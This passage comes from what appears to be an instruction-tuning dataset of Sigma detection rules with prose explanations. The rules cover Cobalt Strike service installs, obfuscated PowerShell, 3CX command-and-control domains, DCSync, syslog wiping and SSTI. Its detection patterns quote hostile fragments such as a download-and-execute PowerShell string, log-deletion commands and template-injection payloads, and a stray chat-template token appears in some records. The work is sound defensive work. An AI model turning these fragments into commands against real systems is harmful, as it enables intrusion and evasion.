      "Sigma": "logsource:\n    product: windows\n    service: system\ndetection:\n    selection_id:\n        Provider_Name: 'Service Control Manager'\n        EventID: 7045\n    selection1:\n        ImagePath|contains|all:\n            - 'ADMIN$'\n            - '.exe'\n    selection2:\n        ImagePath|contains|all:\n            - '%COMSPEC%'\n            - 'start'\n            - 'powershell'\n    selection3:\n        ImagePath|contains: 'powershell -nop -w hidden -encodedcommand'\n    selection4:\n        ImagePath|base64offset|contains: \"IEX (New-Object Net.Webclient).DownloadString('http://127.0.0.1:\"\n    condition: selection_id and (selection1 or selection2 or selection3 or selection4)\nfalsepositives:\n    - Unknown\nlevel: critical\n",
      "question": "known malicious service installs that appear in cases in which a Cobalt Strike beacon elevates privileges or lateral movement",
      "answer": "In order to detect known malicious service installs that appear in cases in which a Cobalt Strike beacon elevates privileges or lateral movement, you should analyze Windows system service logs with an emphasis on the following criteria:\n\n1. Focus on log entries from the Service Control Manager, specifically those with an EventID of 7045. This event ID is indicative of a service being installed on the system.\n\n2. Within these logs, search for service installation paths that exhibit suspicious characteristics, such as:\n   - Paths containing both 'ADMIN$' and '.exe', which might suggest the creation of a service to execute a remote administrative executable, a common tactic for maintaining access or executing commands with elevated privileges.\n   - Paths that include the environment variable '%COMSPEC%', alongside the keywords 'start' and 'powershell'. This pattern can indicate the execution of PowerShell commands through the command prompt (CMD), a technique often utilized for script execution or launching encoded or obfuscated attacks.\n   - Direct indications of PowerShell being used with options designed to hide the activity and possibly execute encoded commands (`powershell -nop -w hidden -encodedcommand`). This is a strong indicator of an attempt to bypass detection mechanisms by running PowerShell in a less conspicuous manner.\n   - Service paths that contain Base64 encoded command sequences, especially those indicating an attempt to execute code or scripts hosted externally (as evidenced by \"IEX (New-Object Net.Webclient).DownloadString\"). This method is often used to retrieve and execute malicious payloads from a controlled external source, typically a web server under the attacker's control.\n\n3. Any instances matching these patterns should be treated with a high level of suspicion. These patterns are indicative of methods associated with advanced persistent threats (APTs) like Cobalt Strike, focusing on stealthy elevation of privileges, lateral movement within a network, and potentially establishing persistence.\n\n4. While analyzing these logs, it's crucial to approach with an understanding that not all matches will indicate a malicious presence (as there can be unknown false positives), but due to the critical nature of these signs, each detection should be investigated thoroughly.\n\nThis approach leverages tailoring detection mechanisms towards the complexity and sophistication of tactics and techniques used in advanced cyber attacks, specifically using PowerShell and service creation for executing malicious activities, which align with tactics and techniques like Execution, Persistence, Privilege Escalation, and Lateral Movement."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting variations of obfuscated powershell IEX invocation code generated by Invoke-Obfuscation framework from the following code block \\u2014.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect all variations of obfuscated PowerShell IEX invocation code generated by Invoke-Obfuscation framework from the following code block \u2014 [/INST], you should monitor Windows PowerShell script activity specifically focusing on Script Block Logging, which needs to be enabled. Look for the execution of PowerShell scripts that contain certain regex patterns in their text, which are indicators of obfuscation techniques typically used to evade detection. These patterns include unusual references to system variables like `$PSHome`, `$ShellId`, `$env:Public`, and `$env:ComSpec`, along with specific obfuscation markers such as string concatenation of array elements, accessing object properties in a non-standard way, and invoking methods in a manner that's commonly used by obfuscated scripts to conceal their actions. Such scripts are indicative of an attacker leveraging the Invoke-Obfuscation framework to mask malicious PowerShell commands. Due to the complexity and variability of these obfuscation techniques, there might be some unknown false positives, but the threat level is considered high, emphasizing the importance of scrutinizing these specific script block texts for potential threats.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    category: ps_script\n    definition: 'Requirements: Script Block Logging must be enabled'\ndetection:\n    selection_iex:\n        - ScriptBlockText|re: '\\$PSHome\\[\\s*\\d{1,3}\\s*\\]\\s*\\+\\s*\\$PSHome\\['\n        - ScriptBlockText|re: '\\$ShellId\\[\\s*\\d{1,3}\\s*\\]\\s*\\+\\s*\\$ShellId\\['\n        - ScriptBlockText|re: '\\$env:Public\\[\\s*\\d{1,3}\\s*\\]\\s*\\+\\s*\\$env:Public\\['\n        - ScriptBlockText|re: '\\$env:ComSpec\\[(\\s*\\d{1,3}\\s*,){2}'\n        - ScriptBlockText|re: '\\*mdr\\*\\W\\s*\\)\\.Name'\n        - ScriptBlockText|re: '\\$VerbosePreference\\.ToString\\('\n    condition: selection_iex\nfalsepositives:\n    - Unknown\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    category: ps_script\n    definition: 'Requirements: Script Block Logging must be enabled'\ndetection:\n    selection_iex:\n        - ScriptBlockText|re: '\\$PSHome\\[\\s*\\d{1,3}\\s*\\]\\s*\\+\\s*\\$PSHome\\['\n        - ScriptBlockText|re: '\\$ShellId\\[\\s*\\d{1,3}\\s*\\]\\s*\\+\\s*\\$ShellId\\['\n        - ScriptBlockText|re: '\\$env:Public\\[\\s*\\d{1,3}\\s*\\]\\s*\\+\\s*\\$env:Public\\['\n        - ScriptBlockText|re: '\\$env:ComSpec\\[(\\s*\\d{1,3}\\s*,){2}'\n        - ScriptBlockText|re: '\\*mdr\\*\\W\\s*\\)\\.Name'\n        - ScriptBlockText|re: '\\$VerbosePreference\\.ToString\\('\n    condition: selection_iex\nfalsepositives:\n    - Unknown\nlevel: high\n",
      "question": "variations of obfuscated powershell IEX invocation code generated by Invoke-Obfuscation framework from the following code block \\u2014",
      "answer": "In order to detect all variations of obfuscated PowerShell IEX invocation code generated by Invoke-Obfuscation framework from the following code block \u2014 [/INST], you should monitor Windows PowerShell script activity specifically focusing on Script Block Logging, which needs to be enabled. Look for the execution of PowerShell scripts that contain certain regex patterns in their text, which are indicators of obfuscation techniques typically used to evade detection. These patterns include unusual references to system variables like `$PSHome`, `$ShellId`, `$env:Public`, and `$env:ComSpec`, along with specific obfuscation markers such as string concatenation of array elements, accessing object properties in a non-standard way, and invoking methods in a manner that's commonly used by obfuscated scripts to conceal their actions. Such scripts are indicative of an attacker leveraging the Invoke-Obfuscation framework to mask malicious PowerShell commands. Due to the complexity and variability of these obfuscation techniques, there might be some unknown false positives, but the threat level is considered high, emphasizing the importance of scrutinizing these specific script block texts for potential threats."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting usage of the \"Add-WindowsCapability\" cmdlet to add Windows capabilities. Notable capabilities could be \"OpenSSH\" and others..\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect usage of the \"Add-WindowsCapability\" cmdlet to add Windows capabilities, notable capabilities being \"OpenSSH\" and others, you should: Monitor Windows PowerShell script logs, specifically looking for instances where the \"Add-WindowsCapability\" command is used. This implies that Script Block Logging must be enabled on the Windows machines you're monitoring. The key string to look out for within the PowerShell scripts is 'Add-WindowsCapability', which is a cmdlet used to add optional features to Windows, such as the \"OpenSSH.Server\" and \"OpenSSH.Client\". It's vital to scan both for the cmdlet itself and for the specific mention of OpenSSH related capabilities. Be aware, though, that there might be legitimate reasons for users or administrators to use this cmdlet, so it\u2019s crucial to apply additional filters or review these instances manually to distinguish between benign and malicious activity. This monitoring and analysis approach is encapsulated within a medium-level alert because while it's an essential method for detecting potential security threats or unauthorized changes, it also has a propensity for false positives due to legitimate administrative actions.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    category: ps_script\n    definition: 'Requirements: Script Block Logging must be enabled'\ndetection:\n    selection_cmdlet:\n        ScriptBlockText|contains: 'Add-WindowsCapability '\n    selection_capa:\n        ScriptBlockText|contains: '-Name OpenSSH.' # For both \"OpenSSH.Server\" and \"OpenSSH.Client\"\n    condition: all of selection_*\nfalsepositives:\n    - Legitimate usage of the capabilities by administrators or users. Add additional filters accordingly.\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    category: ps_script\n    definition: 'Requirements: Script Block Logging must be enabled'\ndetection:\n    selection_cmdlet:\n        ScriptBlockText|contains: 'Add-WindowsCapability '\n    selection_capa:\n        ScriptBlockText|contains: '-Name OpenSSH.' # For both \"OpenSSH.Server\" and \"OpenSSH.Client\"\n    condition: all of selection_*\nfalsepositives:\n    - Legitimate usage of the capabilities by administrators or users. Add additional filters accordingly.\nlevel: medium\n",
      "question": "usage of the \"Add-WindowsCapability\" cmdlet to add Windows capabilities. Notable capabilities could be \"OpenSSH\" and others.",
      "answer": "In order to detect usage of the \"Add-WindowsCapability\" cmdlet to add Windows capabilities, notable capabilities being \"OpenSSH\" and others, you should: Monitor Windows PowerShell script logs, specifically looking for instances where the \"Add-WindowsCapability\" command is used. This implies that Script Block Logging must be enabled on the Windows machines you're monitoring. The key string to look out for within the PowerShell scripts is 'Add-WindowsCapability', which is a cmdlet used to add optional features to Windows, such as the \"OpenSSH.Server\" and \"OpenSSH.Client\". It's vital to scan both for the cmdlet itself and for the specific mention of OpenSSH related capabilities. Be aware, though, that there might be legitimate reasons for users or administrators to use this cmdlet, so it\u2019s crucial to apply additional filters or review these instances manually to distinguish between benign and malicious activity. This monitoring and analysis approach is encapsulated within a medium-level alert because while it's an essential method for detecting potential security threats or unauthorized changes, it also has a propensity for false positives due to legitimate administrative actions."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting potential beaconing activity to domains related to 3CX 3CXDesktopApp compromise.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect potential beaconing activity to domains related to 3CX 3CXDesktopApp compromise, you should monitor network connections from Windows products for any instances where the application involved ends with '\\3CXDesktopApp.exe' and the destination hostname includes one of several specified suspicious domains. These domains, such as 'akamaicontainer.com', 'azuredeploystore.com', and 'officeaddons.com' among others, are indicators that the 3CXDesktopApp may have been compromised and is possibly communicating with a command and control server. Due to the high confidence in these indicators, false positives are considered unlikely. This method focuses on identifying malicious network activity that signals a compromised application, potentially signaling a larger security breach.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: network_connection\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\3CXDesktopApp.exe'\n        DestinationHostname|contains:\n            - 'akamaicontainer.com'\n            - 'akamaitechcloudservices.com'\n            - 'azuredeploystore.com'\n            - 'azureonlinecloud.com'\n            - 'azureonlinestorage.com'\n            - 'dunamistrd.com'\n            - 'glcloudservice.com'\n            - 'journalide.org'\n            - 'msedgepackageinfo.com'\n            - 'msstorageazure.com'\n            - 'msstorageboxes.com'\n            - 'officeaddons.com'\n            - 'officestoragebox.com'\n            - 'pbxcloudeservices.com'\n            - 'pbxphonenetwork.com'\n            - 'pbxsources.com'\n            - 'qwepoi123098.com'\n            - 'sbmsa.wiki'\n            - 'sourceslabs.com'\n            - 'visualstudiofactory.com'\n            - 'zacharryblogs.com'\n    condition: selection\nfalsepositives:\n    - Unlikely\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: network_connection\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\3CXDesktopApp.exe'\n        DestinationHostname|contains:\n            - 'akamaicontainer.com'\n            - 'akamaitechcloudservices.com'\n            - 'azuredeploystore.com'\n            - 'azureonlinecloud.com'\n            - 'azureonlinestorage.com'\n            - 'dunamistrd.com'\n            - 'glcloudservice.com'\n            - 'journalide.org'\n            - 'msedgepackageinfo.com'\n            - 'msstorageazure.com'\n            - 'msstorageboxes.com'\n            - 'officeaddons.com'\n            - 'officestoragebox.com'\n            - 'pbxcloudeservices.com'\n            - 'pbxphonenetwork.com'\n            - 'pbxsources.com'\n            - 'qwepoi123098.com'\n            - 'sbmsa.wiki'\n            - 'sourceslabs.com'\n            - 'visualstudiofactory.com'\n            - 'zacharryblogs.com'\n    condition: selection\nfalsepositives:\n    - Unlikely\nlevel: high\n",
      "question": "potential beaconing activity to domains related to 3CX 3CXDesktopApp compromise",
      "answer": "In order to detect potential beaconing activity to domains related to 3CX 3CXDesktopApp compromise, you should monitor network connections from Windows products for any instances where the application involved ends with '\\3CXDesktopApp.exe' and the destination hostname includes one of several specified suspicious domains. These domains, such as 'akamaicontainer.com', 'azuredeploystore.com', and 'officeaddons.com' among others, are indicators that the 3CXDesktopApp may have been compromised and is possibly communicating with a command and control server. Due to the high confidence in these indicators, false positives are considered unlikely. This method focuses on identifying malicious network activity that signals a compromised application, potentially signaling a larger security breach."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting ntds.dit retrieving using synchronisation with legitimate domain controller using Directory Replication Service Remote Protocol.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect unauthorized attempts to retrieve the ntds.dit file through synchronization with a legitimate domain controller using the Directory Replication Service Remote Protocol, you should monitor specific indicators within Windows Security logs. Look for events that signify access requests to domain controllers, focusing on Windows Security Event IDs 4624 and 4662 in particular.\n\nEvent ID 4624 should be scrutinized for logons to your domain controllers, listed specifically by their names. This helps to identify any successful authentication attempts that could potentially be used for malicious purposes.\n\nAdditionally, monitor for any IP addresses that correspond to your domain controllers in the event of network-based interactions that could bypass typical authentication mechanisms, aiming to identify direct IP interactions that might signify suspicious activities.\n\nCrucially, focus on Event ID 4662, particularly looking for access requests to objects within the domain controllers specified by their names. This event should be cross-referenced with a list of suspicious target logon IDs, which are identified from previous monitoring (as specified in the initial logon monitoring step). The properties to watch for in these access requests include specific GUIDs ('1131f6aa-9c07-11d1-f79f-00c04fc2dcd2' and '1131f6ad-9c07-11d1-f79f-00c04fc2dcd2') that are associated with actions on the domain controller that could indicate an attempt to replicate or retrieve sensitive directory data, such as the ntds.dit file.\n\nDetecting these activities involves a nuanced approach where a successful logon event (EventID 4624) to a domain controller that does not subsequently interact through a direct IP address (as checked against a predetermined list of domain controllers' IPs) flags the logon IDs associated with these events. These flagged IDs are then used to monitor for access (EventID 4662) involving the critical GUID properties. If these conditions are met, it indicates a potential unauthorized attempt to access or replicate directory services data, prompting an alert.\n\nBe aware that there are legitimate circumstances where these indicators may be triggered, such as when an administrator is adding a new domain controller to an existing domain. Therefore, it's crucial to analyze the context of alerts and investigate further to differentiate between legitimate administrative activities and malicious actions.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    service: security\ndetection:\n    selection1:\n        EventID: 4624\n        ComputerName: '%DomainControllersNamesList%'\n    selection2:\n        IpAddress: '%DomainControllersIpsList%'\n    selection3:\n        EventID: 4662\n        ComputerName: '%DomainControllersNamesList%'\n        SubjectLogonId: '%SuspiciousTargetLogonIdList%'\n        Properties|contains: \n            - '1131f6aa-9c07-11d1-f79f-00c04fc2dcd2'\n            - '1131f6ad-9c07-11d1-f79f-00c04fc2dcd2'\n    condition: write TargetLogonId from selection1 (if not selection2) to list %SuspiciousTargetLogonIdList%; then if selection3 -> alert\nfalsepositives:\n    - Legitimate administrator adding new domain controller to already existing domain\nlevel: medium\nstatus: unsupported\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    service: security\ndetection:\n    selection1:\n        EventID: 4624\n        ComputerName: '%DomainControllersNamesList%'\n    selection2:\n        IpAddress: '%DomainControllersIpsList%'\n    selection3:\n        EventID: 4662\n        ComputerName: '%DomainControllersNamesList%'\n        SubjectLogonId: '%SuspiciousTargetLogonIdList%'\n        Properties|contains: \n            - '1131f6aa-9c07-11d1-f79f-00c04fc2dcd2'\n            - '1131f6ad-9c07-11d1-f79f-00c04fc2dcd2'\n    condition: write TargetLogonId from selection1 (if not selection2) to list %SuspiciousTargetLogonIdList%; then if selection3 -> alert\nfalsepositives:\n    - Legitimate administrator adding new domain controller to already existing domain\nlevel: medium\nstatus: unsupported\n",
      "question": "ntds.dit retrieving using synchronisation with legitimate domain controller using Directory Replication Service Remote Protocol",
      "answer": "In order to detect unauthorized attempts to retrieve the ntds.dit file through synchronization with a legitimate domain controller using the Directory Replication Service Remote Protocol, you should monitor specific indicators within Windows Security logs. Look for events that signify access requests to domain controllers, focusing on Windows Security Event IDs 4624 and 4662 in particular.\n\nEvent ID 4624 should be scrutinized for logons to your domain controllers, listed specifically by their names. This helps to identify any successful authentication attempts that could potentially be used for malicious purposes.\n\nAdditionally, monitor for any IP addresses that correspond to your domain controllers in the event of network-based interactions that could bypass typical authentication mechanisms, aiming to identify direct IP interactions that might signify suspicious activities.\n\nCrucially, focus on Event ID 4662, particularly looking for access requests to objects within the domain controllers specified by their names. This event should be cross-referenced with a list of suspicious target logon IDs, which are identified from previous monitoring (as specified in the initial logon monitoring step). The properties to watch for in these access requests include specific GUIDs ('1131f6aa-9c07-11d1-f79f-00c04fc2dcd2' and '1131f6ad-9c07-11d1-f79f-00c04fc2dcd2') that are associated with actions on the domain controller that could indicate an attempt to replicate or retrieve sensitive directory data, such as the ntds.dit file.\n\nDetecting these activities involves a nuanced approach where a successful logon event (EventID 4624) to a domain controller that does not subsequently interact through a direct IP address (as checked against a predetermined list of domain controllers' IPs) flags the logon IDs associated with these events. These flagged IDs are then used to monitor for access (EventID 4662) involving the critical GUID properties. If these conditions are met, it indicates a potential unauthorized attempt to access or replicate directory services data, prompting an alert.\n\nBe aware that there are legitimate circumstances where these indicators may be triggered, such as when an administrator is adding a new domain controller to an existing domain. Therefore, it's crucial to analyze the context of alerts and investigate further to differentiate between legitimate administrative activities and malicious actions."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting specific commands commonly used to remove or empty the syslog. Which is often used by attacker as a method to hide their tracks.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect specific commands commonly used to remove or empty the syslog, which is often used by attackers as a method to hide their tracks, you should: Monitor for the execution of specific command-line instructions related to the deletion or wiping of the `/var/log/syslog` file on Linux systems. The commands to look out for include direct removal commands (`rm` and its variants with options `-r`, `-f`, `-rf`), commands using `unlink` to remove the syslog file and its variants, and commands that overwrite (`mv`, `>` redirects that empty the file) the syslog, effectively clearing its content. These activities should raise alerts due to their potential use in obfuscating unauthorized system access or changes. However, it's important to consider that log rotation processes might occasionally trigger false positives, as they can involve similar commands for managing log files. Given the high impact of missing an attempt to erase audit logs, the detection level is set to high.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: linux\n    category: process_creation\ndetection:\n    selection:\n        CommandLine|contains:\n            - 'rm /var/log/syslog'\n            - 'rm -r /var/log/syslog'\n            - 'rm -f /var/log/syslog'\n            - 'rm -rf /var/log/syslog'\n            - 'unlink /var/log/syslog'\n            - 'unlink -r /var/log/syslog'\n            - 'unlink -f /var/log/syslog'\n            - 'unlink -rf /var/log/syslog'\n            - 'mv /var/log/syslog'\n            - ' >/var/log/syslog'\n            - ' > /var/log/syslog'\n    condition: selection\nfalsepositives:\n    - Log rotation.\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: linux\n    category: process_creation\ndetection:\n    selection:\n        CommandLine|contains:\n            - 'rm /var/log/syslog'\n            - 'rm -r /var/log/syslog'\n            - 'rm -f /var/log/syslog'\n            - 'rm -rf /var/log/syslog'\n            - 'unlink /var/log/syslog'\n            - 'unlink -r /var/log/syslog'\n            - 'unlink -f /var/log/syslog'\n            - 'unlink -rf /var/log/syslog'\n            - 'mv /var/log/syslog'\n            - ' >/var/log/syslog'\n            - ' > /var/log/syslog'\n    condition: selection\nfalsepositives:\n    - Log rotation.\nlevel: high\n",
      "question": "specific commands commonly used to remove or empty the syslog. Which is often used by attacker as a method to hide their tracks",
      "answer": "In order to detect specific commands commonly used to remove or empty the syslog, which is often used by attackers as a method to hide their tracks, you should: Monitor for the execution of specific command-line instructions related to the deletion or wiping of the `/var/log/syslog` file on Linux systems. The commands to look out for include direct removal commands (`rm` and its variants with options `-r`, `-f`, `-rf`), commands using `unlink` to remove the syslog file and its variants, and commands that overwrite (`mv`, `>` redirects that empty the file) the syslog, effectively clearing its content. These activities should raise alerts due to their potential use in obfuscating unauthorized system access or changes. However, it's important to consider that log rotation processes might occasionally trigger false positives, as they can involve similar commands for managing log files. Given the high impact of missing an attempt to erase audit logs, the detection level is set to high."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting remote RPC calls to create or execute a scheduled task via SASec.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect remote RPC calls to create or execute a scheduled task via SASec, you should: Monitor the application logs specifically from RPC firewalls. It is essential to have the RPC Firewall installed and configured to audit and block processes matching the UUID \"378e52b0-c0a9-11cf-822d-00aa0051e40f\". Pay particular attention to logs tagged as \"RPCFW\" within the Event Log. Look for events with the ID of 3, which signifies an interaction with the targeted interface UUID. Specifically, watch for operation numbers 0 and 1, as these are indicative of the creation or execution of a scheduled task through remote procedure calls. Be aware that while the detection level is set to high, there may be unknown false positives, indicating the potential for legitimate activities being flagged. Understanding and monitoring for these specific attributes will aid in identifying suspicious activities associated with scheduling tasks remotely, which could be a sign of malicious intent.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: rpc_firewall\n    category: application\n    definition: 'Requirements: install and apply the RPC Firewall to all processes with \"audit:true action:block uuid:378e52b0-c0a9-11cf-822d-00aa0051e40f\"'\ndetection:\n    selection:\n        EventLog: RPCFW\n        EventID: 3\n        InterfaceUuid: 378e52b0-c0a9-11cf-822d-00aa0051e40f\n        OpNum:\n            - 0\n            - 1\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: rpc_firewall\n    category: application\n    definition: 'Requirements: install and apply the RPC Firewall to all processes with \"audit:true action:block uuid:378e52b0-c0a9-11cf-822d-00aa0051e40f\"'\ndetection:\n    selection:\n        EventLog: RPCFW\n        EventID: 3\n        InterfaceUuid: 378e52b0-c0a9-11cf-822d-00aa0051e40f\n        OpNum:\n            - 0\n            - 1\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high\n",
      "question": "remote RPC calls to create or execute a scheduled task via SASec",
      "answer": "In order to detect remote RPC calls to create or execute a scheduled task via SASec, you should: Monitor the application logs specifically from RPC firewalls. It is essential to have the RPC Firewall installed and configured to audit and block processes matching the UUID \"378e52b0-c0a9-11cf-822d-00aa0051e40f\". Pay particular attention to logs tagged as \"RPCFW\" within the Event Log. Look for events with the ID of 3, which signifies an interaction with the targeted interface UUID. Specifically, watch for operation numbers 0 and 1, as these are indicative of the creation or execution of a scheduled task through remote procedure calls. Be aware that while the detection level is set to high, there may be unknown false positives, indicating the potential for legitimate activities being flagged. Understanding and monitoring for these specific attributes will aid in identifying suspicious activities associated with scheduling tasks remotely, which could be a sign of malicious intent."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting SSTI attempts sent via GET requests in access logs.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect SSTI attempts sent via GET requests in access logs, you should monitor the access logs of web servers for specific patterns within GET requests that indicate an attempt to exploit Server-Side Template Injection (SSTI) vulnerabilities. These patterns consist of various encodings and method calls that are commonly used in SSTI attacks, including but not limited to '{{', '%7B%7B' (URL encoded '{{'), '${', '=$%7B', '<%=', '=%3C%25=', '@(', 'freemarker.template.utility.Execute', '.getClass().forName('javax.script.ScriptEngineManager')', and 'T(org.apache.commons.io.IOUtils)'. It is important to also include a filtering condition to exclude any GET requests that result in a 404 status code, as these might not be relevant for detecting successful SSTI exploitation attempts. However, be mindful of potential false positives, such as legitimate user searches within the website's search box that might inadvertently match these patterns, or the noise generated from internal vulnerability scanning tools. To mitigate these false positives, it might be beneficial to incorporate additional filters, like checking user agent strings and considering more HTTP response codes. Monitoring for these specific patterns is crucial, as it helps identify attackers attempting to leverage SSTI vulnerabilities, which is a high-severity concern owing to the potential for executing arbitrary code on the server, hence the high level of importance attached to detecting these attempts.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: webserver\ndetection:\n    select_method:\n        cs-method: 'GET'\n    keywords:\n        - '={{'\n        - '=%7B%7B'\n        - '=${'\n        - '=$%7B'\n        - '=<%='\n        - '=%3C%25='\n        - '=@('\n        - 'freemarker.template.utility.Execute'\n        - .getClass().forName('javax.script.ScriptEngineManager')\n        - 'T(org.apache.commons.io.IOUtils)'\n    filter:\n        sc-status: 404\n    condition: select_method and keywords and not filter\nfalsepositives:\n    - User searches in search boxes of the respective website\n    - Internal vulnerability scanners can cause some serious FPs when used, if you experience a lot of FPs due to this think of adding more filters such as \"User Agent\" strings and more response codes\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: webserver\ndetection:\n    select_method:\n        cs-method: 'GET'\n    keywords:\n        - '={{'\n        - '=%7B%7B'\n        - '=${'\n        - '=$%7B'\n        - '=<%='\n        - '=%3C%25='\n        - '=@('\n        - 'freemarker.template.utility.Execute'\n        - .getClass().forName('javax.script.ScriptEngineManager')\n        - 'T(org.apache.commons.io.IOUtils)'\n    filter:\n        sc-status: 404\n    condition: select_method and keywords and not filter\nfalsepositives:\n    - User searches in search boxes of the respective website\n    - Internal vulnerability scanners can cause some serious FPs when used, if you experience a lot of FPs due to this think of adding more filters such as \"User Agent\" strings and more response codes\nlevel: high\n",
      "question": "SSTI attempts sent via GET requests in access logs",
      "answer": "In order to detect SSTI attempts sent via GET requests in access logs, you should monitor the access logs of web servers for specific patterns within GET requests that indicate an attempt to exploit Server-Side Template Injection (SSTI) vulnerabilities. These patterns consist of various encodings and method calls that are commonly used in SSTI attacks, including but not limited to '{{', '%7B%7B' (URL encoded '{{'), '${', '=$%7B', '<%=', '=%3C%25=', '@(', 'freemarker.template.utility.Execute', '.getClass().forName('javax.script.ScriptEngineManager')', and 'T(org.apache.commons.io.IOUtils)'. It is important to also include a filtering condition to exclude any GET requests that result in a 404 status code, as these might not be relevant for detecting successful SSTI exploitation attempts. However, be mindful of potential false positives, such as legitimate user searches within the website's search box that might inadvertently match these patterns, or the noise generated from internal vulnerability scanning tools. To mitigate these false positives, it might be beneficial to incorporate additional filters, like checking user agent strings and considering more HTTP response codes. Monitoring for these specific patterns is crucial, as it helps identify attackers attempting to leverage SSTI vulnerabilities, which is a high-severity concern owing to the potential for executing arbitrary code on the server, hence the high level of importance attached to detecting these attempts."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting suspicious changes to the Windows Defender configuration.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect suspicious changes to the Windows Defender configuration, you should monitor for specific modifications made to the Windows Defender\u2019s settings that could undermine the system's security integrity. This includes changes logged in Windows Defender's operational logs under the service name 'windefend', specifically with an event ID 5007, which denotes that the antimalware platform's configuration has been altered. Key changes to watch for include the disabling of AntiSpyware, the disabling of removable drive scanning, the disabling of scanning mapped network drives for a full scan, the disabling of block at first seen in SpyNet, changes to SpyNet reporting settings, and modifications to the consent level for submitting samples to Microsoft for analysis. These modifications are critical to monitor as they can significantly lower the protective measures of Windows Defender, making the system more vulnerable to malware and other cyber threats. It\u2019s also important to note that while administrator activity might account for some changes and could initially be considered as false positives, such activity still requires investigation to ensure it's not malicious. Monitoring these changes is crucial for maintaining the security posture of a Windows-based system and is associated with tactics and techniques like defense evasion.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    service: windefend\ndetection:\n    selection:\n        EventID: 5007 # The antimalware platform configuration changed.\n        NewValue|contains:\n            # TODO: Add more suspicious values\n            - '\\Windows Defender\\DisableAntiSpyware '\n            #- '\\Windows Defender\\Features\\TamperProtection ' # Might produce FP\n            - '\\Windows Defender\\Scan\\DisableRemovableDriveScanning '\n            - '\\Windows Defender\\Scan\\DisableScanningMappedNetworkDrivesForFullScan '\n            - '\\Windows Defender\\SpyNet\\DisableBlockAtFirstSeen '\n            - '\\Real-Time Protection\\SpyNetReporting '\n            - '\\Real-Time Protection\\SubmitSamplesConsent '\n            # Exclusions changes are covered in 1321dc4e-a1fe-481d-a016-52c45f0c8b4f\n            # Exploit guard changes are covered in a3ab73f1-bd46-4319-8f06-4b20d0617886\n    condition: selection\nfalsepositives:\n    - Administrator activity (must be investigated)\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    service: windefend\ndetection:\n    selection:\n        EventID: 5007 # The antimalware platform configuration changed.\n        NewValue|contains:\n            # TODO: Add more suspicious values\n            - '\\Windows Defender\\DisableAntiSpyware '\n            #- '\\Windows Defender\\Features\\TamperProtection ' # Might produce FP\n            - '\\Windows Defender\\Scan\\DisableRemovableDriveScanning '\n            - '\\Windows Defender\\Scan\\DisableScanningMappedNetworkDrivesForFullScan '\n            - '\\Windows Defender\\SpyNet\\DisableBlockAtFirstSeen '\n            - '\\Real-Time Protection\\SpyNetReporting '\n            - '\\Real-Time Protection\\SubmitSamplesConsent '\n            # Exclusions changes are covered in 1321dc4e-a1fe-481d-a016-52c45f0c8b4f\n            # Exploit guard changes are covered in a3ab73f1-bd46-4319-8f06-4b20d0617886\n    condition: selection\nfalsepositives:\n    - Administrator activity (must be investigated)\nlevel: high\n",
      "question": "suspicious changes to the Windows Defender configuration",
